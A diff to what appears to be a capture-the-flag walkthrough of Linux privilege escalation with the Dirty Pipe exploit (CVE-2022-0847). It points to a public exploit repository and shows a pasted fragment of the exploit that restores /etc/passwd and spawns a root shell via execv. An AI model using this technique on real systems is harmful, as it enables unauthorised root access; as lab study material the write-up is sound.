@@ -105,6 +105,20 @@ Vulnerable to CVE-2022-0847
 After testing all 3 I finally had some luck with this one. https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit The other were giving me issues and breaking my shell.
 
 So we are going to navigate to /tmp and since we cannot get files on the system we can just copy and paste the exploit into our own file using ```echo 'EXPLOIT GOES HERE' > exploit.c```
+NOTE: After copying and pasting the shell looks a little messed up and should look something like what is directly below. So just add the ```' > exploit.c``` and it will work fine.
+
+```console
+> <Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
+>                 "cp /tmp/passwd.bak /etc/passwd;"
+>                 "echo \\\"Done! Popping shell... (run commands now)\\\";"
+>                 "/bin/sh;"
+>             "\" root"};
+>         execv("/bin/sh", argv);
+> 
+>         printf("system() function call seems to have failed :(\n");
+> return EXIT_SUCCESS;
+> ' > exploit.c
+```
 
 I confirm the file is created.
 
